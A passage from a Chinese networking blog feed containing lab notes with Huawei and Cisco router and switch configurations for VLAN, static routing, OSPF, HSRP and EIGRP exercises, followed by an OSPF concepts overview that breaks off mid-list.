title="二、简单的静态路由实验"></a>二、简单的静态路由实验</h2><p>配置静态路由，是LoopbBack 0之间可以Ping通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082342450.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1. 给设备命名2. 配置路由器之间的接口IP地址3. 添加静态路由4. 测试Loopback0口之间的网络</code></pre></details><details>  <summary>R1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R1<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 12.1.1.1 255.255.255.0quit<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 13.1.1.1 255.255.255.0quit<span class="hljs-comment"># </span>interface LoopBack 0ip address 1.1.1.1 255.255.255.255quit<span class="hljs-comment"># </span>display ip interface briefdisplay ip routing-table<span class="hljs-comment">#</span>ip route-static 2.2.2.2 32 GigabitEthernet 0/0/0 12.1.1.2ip route-static 3.3.3.3 32 GigabitEthernet 0/0/1 13.1.1.3display ip routing-table</code></pre></details><details>  <summary>R2</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R2<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 12.1.1.2 255.255.255.0quit<span class="hljs-comment"># </span>interface LoopBack 0ip address 2.2.2.2 255.255.255.255quit<span class="hljs-comment"># </span>display ip interface briefdisplay ip routing-table<span class="hljs-comment">#</span>ip route-static 1.1.1.1 32 GigabitEthernet 0/0/1 12.1.1.1ip route-static 3.3.3.3 32 GigabitEthernet 0/0/1 12.1.1.1display ip routing-table</code></pre></details><details>  <summary>R3</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R3<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 13.1.1.3 255.255.255.0quit<span class="hljs-comment"># </span>interface LoopBack 0ip address 3.3.3.3 255.255.255.255quit<span class="hljs-comment"># </span>display ip interface briefdisplay ip routing-table<span class="hljs-comment">#</span>ip route-static 1.1.1.1 32 GigabitEthernet 0/0/0 13.1.1.1ip route-static 2.2.2.2 32 GigabitEthernet 0/0/0 13.1.1.1display ip routing-table</code></pre></details><details>  <summary>查看路由信息</summary>  <p>配置动态路由之前直连路由信息</p><p>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090005760.png" alt="R1直连路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090014248.png" alt="R2直连路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090014528.png" alt="R3直连路由"></p>  <p>配置动态路由之后的路由信息</p><p>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090013966.png" alt="R1直连和静态路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090015008.png" alt="R2直连和静态路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304090016644.png" alt="R3直连和静态路由"></p></details><hr><h2 id="三、简单的OSPF实验"><a href="#三、简单的OSPF实验" class="headerlink" title="三、简单的OSPF实验"></a>三、简单的OSPF实验</h2><p>使用OSPF协议使PC1和PC2互通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091024537.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1. 路由器启用OSPF进程2. 设置路由器ID3. 路由器之间的直连接口宣告到同一个区域4. 路由器与非路由的接口也需要宣告一个区域</code></pre></details><details>  <summary>R1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R1<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 12.1.1.1 255.255.255.0quit<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 13.1.1.1 255.255.255.0quit<span class="hljs-comment"># </span>display ip interface brief<span class="hljs-comment"># </span>ospf 10 router-id 1.1.1.1area 0network 12.1.1.1 0.0.0.0network 13.1.1.1 0.0.0.0quit<span class="hljs-comment"># </span>display ospf peer briefdisplay ospf lsdbdisplay ip routing-table protocol ospf<span class="hljs-comment"># </span></code></pre></details><details>  <summary>R2</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R2<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 12.1.1.2 255.255.255.0quit<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 2.2.2.254 255.255.255.0quit<span class="hljs-comment"># </span>display ip interface brief<span class="hljs-comment"># </span>ospf 10 router-id 2.2.2.2area 0network 2.2.2.254 0.0.0.0quit<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ospf <span class="hljs-built_in">enable</span> 10 area 0quit<span class="hljs-comment"># </span>display ospf peer briefdisplay ospf lsdbdisplay ip routing-table protocol ospf<span class="hljs-comment"># </span></code></pre></details><details>  <summary>R3</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R3<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 13.1.1.3 255.255.255.0quit<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 3.3.3.254 255.255.255.0quit<span class="hljs-comment">#</span>display ip interface brief<span class="hljs-comment"># </span>ospf 10 router-id 3.3.3.3area 0network 13.1.1.3 0.0.0.0network 3.3.3.254 0.0.0.0quit<span class="hljs-comment"># </span>display ospf peer briefdisplay ospf lsdbdisplay ip routing-table protocol ospf<span class="hljs-comment"># </span></code></pre></details><details>  <summary>测试验证</summary><p>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091031328.png" alt="PC1 ping PC2"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091032131.png" alt="PC2 ping PC1"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091029671.png" alt="R1的邻居&amp;LSDB&amp;路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091033508.png" alt="R2的邻居&amp;LSDB&amp;路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091035347.png" alt="R3的邻居&amp;LSDB&amp;路由"></p></details><hr><h2 id="Templet、实验模板"><a href="#Templet、实验模板" class="headerlink" title="Templet、实验模板"></a>Templet、实验模板</h2><p>实验概述。</p><p>实验拓扑</p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1.</code></pre></details><details>  <summary>R1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname R1</code></pre></details><details>  <summary>测试验证</summary></details>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CCNA Lab</title>
      <link href="/2023/04/07/CCNA-Lab/"/>
      <url>/2023/04/07/CCNA-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简单的-VLAN-实验"><a href="#一、简单的-VLAN-实验" class="headerlink" title="一、简单的 VLAN 实验"></a>一、简单的 VLAN 实验</h2><p>设 PC1 和 PC3 都是 VLAN13，PC2 和 PC4 属于 VLAN24，实现同一个 VLAN 的设备可以互通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20230408101203.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1. 交换机：在SW1~3都创建2个vlan；2. 交换机-交换机：在交换机之间的连接接口配置中继，并且放行相应的VLAN；3. 交换机-PC：在交换机与PC连接的接口配置Access接口，并且方通相应的VLAN；4. PC：配置对于VLAN的IP。</code></pre></details><details>  <summary>SW1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalvlan 10<span class="hljs-built_in">exit</span>vlan 20endshow vlan brief<span class="hljs-comment">#</span>configure terminalinterface range ethernet 0/0 - 1shutdownswitchport trunk encapsulation dot1qswitchport mode trunkno shutdownendshow interface trunkwrite</code></pre></details><details>  <summary>SW2</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalvlan 10<span class="hljs-built_in">exit</span>vlan 20endshow vlan brief<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/0shutdownswitchport trunk encapsulation dot1qswitchport mode trunkno shutdownendshow interface trunk<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/1switchport mode accessswitchport access vlan 10spanning-tree portfast <span class="hljs-built_in">disable</span><span class="hljs-built_in">exit</span>interface ethernet 0/2switchport mode accessswitchport access vlan 20spanning-tree portfast <span class="hljs-built_in">disable</span>endshow vlan briefwrite</code></pre></details><details>  <summary>SW3</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalvlan 10<span class="hljs-built_in">exit</span>vlan 20endshow vlan brief<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/0shutdownswitchport trunk encapsulation dot1qswitchport mode trunkno shutdownendshow interface trunk<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/1switchport mode accessswitchport access vlan 10spanning-tree portfast <span class="hljs-built_in">disable</span><span class="hljs-built_in">exit</span>interface ethernet 0/2switchport mode accessswitchport access vlan 20spanning-tree portfast <span class="hljs-built_in">disable</span>endshow vlan briefwrite</code></pre></details><details>  <summary>PC</summary><pre><code class="hljs bash"><span class="hljs-comment"># PC1</span>ip 13.1.1.1 255.255.255.0<span class="hljs-comment"># PC2</span>ip 24.1.1.2 255.255.255.0<span class="hljs-comment"># PC3</span>ip 13.1.1.3 255.255.255.0<span class="hljs-comment"># PC4</span>ip 24.1.1.4 255.255.255.0</code></pre></details><details>  <summary>实验验证</summary><pre><code class="hljs bash"><span class="hljs-comment"># PC1 ping PC3</span>ping 13.1.1.3<span class="hljs-comment"># PC2 ping PC4</span>ping 24.1.1.4</code></pre></details><hr><h2 id="二、简单的静态路由实验"><a href="#二、简单的静态路由实验" class="headerlink" title="二、简单的静态路由实验"></a>二、简单的静态路由实验</h2><p>配置静态路由，是 Loopback 0 之间可以 Ping 通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082233671.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1. 给设备命名2. 配置路由器之间的接口IP地址3. 添加静态路由4. 测试Loopback0口之间的网络</code></pre></details><details>  <summary>R1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R1<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span>interface ethernet 0/1no shutdownip address 13.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 1.1.1.1 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalip route 2.2.2.2 255.255.255.255 ethernet 0/0 12.1.1.2ip route 3.3.3.3 255.255.255.255 ethernet 0/1 13.1.1.3</code></pre></details><details>  <summary>R2</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R2<span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 12.1.1.2 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 2.2.2.2 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalip route 1.1.1.1 255.255.255.255 ethernet 0/1 12.1.1.1ip route 3.3.3.3 255.255.255.255 ethernet 0/1 12.1.1.1</code></pre></details><details>  <summary>R3</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R2<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 13.1.1.3 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 3.3.3.3 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalip route 1.1.1.1 255.255.255.255 ethernet 0/0 13.1.1.1ip route 2.2.2.2 255.255.255.255 ethernet 0/0 13.1.1.1</code></pre></details><details>  <summary>查看路由信息</summary>  <p>配置动态路由之前直连路由信息</p><p>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082303379.png" alt="R1直连路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082314508.png" alt="R2直连路由"><br>  <img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082315384.png" alt="R3直连路由"></p>  <p>配置动态路由之后的路由信息</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082326950.png" alt="R1直连和静态路由"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082328942.png" alt="R2直连和静态路由"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304082329117.png" alt="R3直连和惊天路由"></p></details><hr><h2 id="三、简单的-OSPF-实验"><a href="#三、简单的-OSPF-实验" class="headerlink" title="三、简单的 OSPF 实验"></a>三、简单的 OSPF 实验</h2><p>使用 OSPF 协议使 PC1 和 PC2 互通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091126038.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1. 路由器启用OSPF进程2. 设置路由器ID3. 路由器之间的直连接口宣告到同一个区域4. 路由器与非路由的接口也需要宣告一个区域</code></pre></details><details>  <summary>R1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R1<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 13.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router ospf 110router-id 1.1.1.1network 12.1.1.1 0.0.0.0 area 0network 13.1.1.1 0.0.0.0 area 0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip ospf neighborshow ip ospf databaseshow ip route ospf<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R2</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R2<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.2 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 2.2.2.254 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router ospf 110router-id 2.2.2.2network 12.1.1.2 0.0.0.0 area 0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1ip ospf 110 area 0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip ospf neighborshow ip ospf databaseshow ip route ospf<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R3</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R3<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 13.1.1.3 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 3.3.3.254 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router ospf 110router-id 3.3.3.3network 13.1.1.3 0.0.0.0 area 0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1ip ospf 110 area 0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip ospf neighborshow ip ospf databaseshow ip route ospf<span class="hljs-comment">#</span></code></pre></details></details><details>  <summary>PC</summary><pre><code class="hljs bash"><span class="hljs-comment"># PC1</span>ip 2.2.2.1 255.255.255.0 2.2.2.254<span class="hljs-comment"># PC2</span>ip 3.3.3.2 255.255.255.0 3.3.3.254</code></pre></details><details>  <summary>测试验证</summary><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091121409.png" alt="PC1 ping PC2"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091119296.png" alt="R1的OSPF邻居&amp;DB&amp;路由表"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091122906.png" alt="R2的OSPF邻居&amp;DB&amp;路由表"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091123882.png" alt="R3的OSPF邻居&amp;DB&amp;路由表"></p></details><hr><h2 id="四、简单的-FHRP-实验"><a href="#四、简单的-FHRP-实验" class="headerlink" title="四、简单的 FHRP 实验"></a>四、简单的 FHRP 实验</h2><p>在 R2 和 R3 的 ethernet0&#x2F;1 口使用 FHRP 使 PC 的网关冗余。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091447043.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1. 配置对于的接口IP地址和路由协议2. 在可能的网关设备的网关接口上配置FHRP的Virtual IP 和 优先级</code></pre></details><details>  <summary>R1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R1<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 13.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface loopback 0ip address 1.1.1.1 255.255.255.255<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router eigrp 90eigrp router-id 1.1.1.1network 12.1.1.1 0.0.0.0network 13.1.1.1 0.0.0.0network 1.1.1.1 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip route eigrp<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R2</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R2<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.2 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 100.1.1.252 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router eigrp 90eigrp router-id 2.2.2.2network 12.1.1.2 0.0.0.0network 100.1.1.252 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip route eigrp<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/1standby 100 ip 100.1.1.254standby 100 priority 105<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow standby brief<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R3</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R3<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 13.1.1.3 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>interface ethernet 0/1no shutdownip address 100.1.1.253 255.255.255.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>router eigrp 90eigrp router-id 3.3.3.3network 13.1.1.3 0.0.0.0network 100.1.1.253 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip route eigrp<span class="hljs-comment">#</span>configure terminalinterface ethernet 0/1standby 100 ip 100.1.1.254<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow standby brief<span class="hljs-comment">#</span></code></pre></details><details>  <summary>测试验证</summary><ol><li>PC1 一直 ping R1 的 Loopback</li><li>将 R2 的 ethernet 0&#x2F;1 shutdown</li><li>查看 PC1 的 ping 状态、交换机的 mac address-table 是否有变化</li><li>查看路由器的 standby</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091502939.png" alt="PC1 ping R1 Loopback0"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091502847.png" alt="SW1"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091505387.png" alt="R1"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091508725.png" alt="R2"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304091509854.png" alt="R3"></p></details><hr><h2 id="五、简单的-EIGRP-实验"><a href="#五、简单的-EIGRP-实验" class="headerlink" title="五、简单的 EIGRP 实验"></a>五、简单的 EIGRP 实验</h2><p>配置 EIGRP 使路由器的 Loopback0 口都可以互通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304100751654.png" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1.</code></pre></details><details>  <summary>R1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R1<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span>interface ethernet 0/1no shutdownip address 13.1.1.1 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 1.1.1.1 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalrouter eigrp 90no auto-summaryeigrp router-id 1.1.1.1network 1.1.1.1 0.0.0.0network 12.1.1.1 0.0.0.0network 13.1.1.1 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip eigrp interfacesshow ip eigrp neighborsshow ip route eigrp<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R2</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R2<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 12.1.1.2 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 2.2.2.2 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalrouter eigrp 90no auto-summaryeigrp router-id 2.2.2.2network 2.2.2.2 0.0.0.0network 12.1.1.2 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip eigrp interfacesshow ip eigrp neighborsshow ip route eigrp<span class="hljs-comment">#</span></code></pre></details><details>  <summary>R3</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R3<span class="hljs-comment">#</span>interface ethernet 0/0no shutdownip address 13.1.1.3 255.255.255.0<span class="hljs-built_in">exit</span>interface loopback 0ip address 3.3.3.3 255.255.255.255end<span class="hljs-comment">#</span>show ip interface brief<span class="hljs-comment">#</span>configure terminalrouter eigrp 90no auto-summaryeigrp router-id 3.3.3.3network 3.3.3.3 0.0.0.0network 13.1.1.3 0.0.0.0<span class="hljs-built_in">exit</span><span class="hljs-comment">#</span>endshow ip eigrp interfacesshow ip eigrp neighborsshow ip route eigrp<span class="hljs-comment">#</span></code></pre></details><details>  <summary>测试验证</summary><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304100755226.png" alt="R1"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304100758230.png" alt="R2"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304100802550.png" alt="R3"></p></details><hr><h2 id="实验模板"><a href="#实验模板" class="headerlink" title="实验模板"></a>实验模板</h2><p>实验概述。</p><p><img src="/" alt="实验拓扑"></p><details>  <summary>配置概述</summary><pre><code class="hljs bash">1.</code></pre></details><details>  <summary>R1</summary><pre><code class="hljs bash"><span class="hljs-comment">#</span><span class="hljs-built_in">enable</span>configure terminalhostname R1</code></pre></details><details>  <summary>测试验证</summary></details>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSPF</title>
      <link href="/2023/04/07/OSPF/"/>
      <url>/2023/04/07/OSPF/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>Open Shortest Path First (OSPF) 是一种 Link-State Routing Protocol, OSPF 中的 <strong>Router</strong> 都会向 <strong>Neighbor</strong> 交换自己的 <strong>Link-State</strong>, 当 Router 收到这些 Link-State 之后，就会使用 Dijkstra Algorithm (狄杰斯特拉算法) 计算出最短的路径 (Shortest Path).</p><h2 id="1-1-AreaArea"><a href="#1-1-AreaArea" class="headerlink" title="1.1 AreaArea"></a>1.1 AreaArea</h2><p>Area 是 OSPF 在中大型网络中为了解决管理上的问题，设置的一种分层系统, Area 一般使用一个 16 Bits (0~65535)的数字表示, 其中 Area 0 是一个特别的 Area, 我们一般称之为 Backbone Area (骨干区域), 其他所有的 Area 必须与 Area 0 连接。从设计层面降低环路出现的风险。</p><h2 id="1-2-Router"><a href="#1-2-Router" class="headerlink" title="1.2 Router"></a>1.2 Router</h2><ol><li>Internal Router: 参与 OSPF 的所有 Interface 都连接在同一个 Area 的 Router.</li><li>Backbone Router: 最少一个参与 OSPF 的 Interface 连接在 Backbone Area 的 Router.</li><li>Area Border Router (<strong>ABR</strong>): 连接两个 Area (必须包含一个 <strong>Area0</strong>) 或以上的 Router.</li><li>Autonomous System Border Routers (<strong>ASBR</strong>): 有 Interface 连接到其他 AS，并且引入了外部路由 的 Router.</li></ol><h2 id="1-3-Neighbor-与-Adjacency-的建立"><a href="#1-3-Neighbor-与-Adjacency-的建立" class="headerlink" title="1.3 Neighbor 与 Adjacency 的建立"></a>1.3 Neighbor 与 Adjacency 的建立</h2><ol><li>Down: 没有发送 Hello Message.</li><li>Init: 刚刚向对方发送 Hello Message.</li><li>2-Way: 两个 Router 以成为 Neighbor. 他们开始沟通了! 在这个时候，他们会选出 DR 和 BDR. 如果未能成为 DR 和 BDR, 则成为 DROTHER, DROTHER 会停在 2-Way 的状态.</li><li>ExStart: 准备交换 Link 的信息.</li><li>Exchange: 他们开始交换 DBD (Database Descriptors).</li><li>Loading: 正在交换 LSA.</li><li>Full: 两个 Router 成为 Adjacency。LSA 交换完成, 此时同一个 Area 的 Router 里面的 Topology Table 应该是完成相同的.</li></ol><h2 id="1-4-成为-Neigbhor-的条件"><a href="#1-4-成为-Neigbhor-的条件" class="headerlink" title="1.4 成为 Neigbhor 的条件:"></a>1.4 成为 Neigbhor 的条件:</h2><blockquote><p>Router-id: 按照优先级可以是指定的 Router-id; Loopback Interface 的最大 IP Address; 参与 OSPF 的 Interface IP Address.<br>Priority: 用于选举 DR&#x2F;BDR&#x2F;DROTHER,越大越优先; 如果优先级一样就比较 Router-id.<br>Dead Time: 默认由 40 秒开始倒数，如果一直倒数到 0 秒没有还收到 Hello, 就判断 Neighbor 离线了.<br>State: 可以表示 Neighbor 的状态和 DR&#x2F;BDR&#x2F;DROTHER 的角色.</p></blockquote><ol><li>Area ID 相同.</li><li>Area Type 相同. Backbone Area (Area 0), Standard Area, Stub Area, Totally Stubby Area, Not-so-stubby Area 和 Totally Not-so-stubby Area.</li><li>Prefix 与 Subnet Mask 必须相同.</li><li>Interval Timer 时间相同. Hello Interval 和 Dead Interval 时间必须相同.</li><li>Authentication 认证相同. 认证方式有无密码认证, 明文认证和密文认证.</li></ol><h1 id="四、Designated-Router"><a href="#四、Designated-Router" class="headerlink" title="四、Designated Router"></a>四、Designated Router</h1><ol><li>在 Broadcast Multi-Access 的网络中, 例如我们常用的 Ethernet,</li><li>同一个网络中可能会连接着 3 个或以上的 Router, 即每个 Router 需要建立 n-1 的 connection,</li><li>Full Mesh 的 connection 数量为 n(n-1)&#x2F;2;</li><li>如果在网络中选一位 DR(Designated Router), 其他的 Router 只需与 DR 建立 connection,</li><li>每次有 Routing Update, Router 只需把 Update 传给 DR, 再由 DR 统一发给其他 Router;</li><li>这样网络中每个 Router 只需处理一条 Connection;</li><li>还要选一位 BDR(Backup Designated Router), 是在 DR 离线时由 BDR 顶上变成 DR.</li></ol><h1 id="五、Network-Type"><a href="#五、Network-Type" class="headerlink" title="五、Network Type"></a>五、Network Type</h1><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231229162056.png" alt="Network Type"></p><p>Network Type</p><h1 id="六、Link-state-Advertisement-LAS"><a href="#六、Link-state-Advertisement-LAS" class="headerlink" title="六、Link-state Advertisement (LAS)"></a>六、Link-state Advertisement (LAS)</h1><ol><li>Router LSA (Type 1): 描述 Router 连接的 Router 信息. Area 内的 Router 都会产生一条, Area 内传递.</li><li>Network LSA (Type 2): 描述 DR 连接的 Router 信息. Area 内的 DR 产生一条, Area 内传递.</li><li>Network Summary LSA (Type 3): 描述 Area 内的 Router 去往 Area 间的路由信息. ABR 产生, 一条 Area 间路由产生一条 LSA, Area 间传递.</li><li>ASBR Summary (Type 4): 描述 Area 内的 Router 去往 ASBR 的路由信息. ABR 产生, 一台 ASBR 产生一条 LSA, Area 间传递.</li><li>External LSA (Type 5): 描述 Area 外的 External Network 路由信息. ASBR 产生, 一条外部路由产生一条 LSA, Area 传递.(除了 Stub Area)</li><li>(Type 7)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231229162242.png" alt="LSA"></p><p>LSA</p><h1 id="七、特殊区域"><a href="#七、特殊区域" class="headerlink" title="七、特殊区域"></a>七、特殊区域</h1><blockquote><p>减少 LSA 的发送, 简化 Route Table.<br>Stub Area 和 Totally Stubby Area 适用于没有连接 External Network 的 Area</p></blockquote><ol><li>Stud Area: 禁止 Type4 和 Type5 的 LSA 进入, ABR 会下发一条 Default Rtoue 的 Type3 LSA.</li><li>Totally Stubby Area: 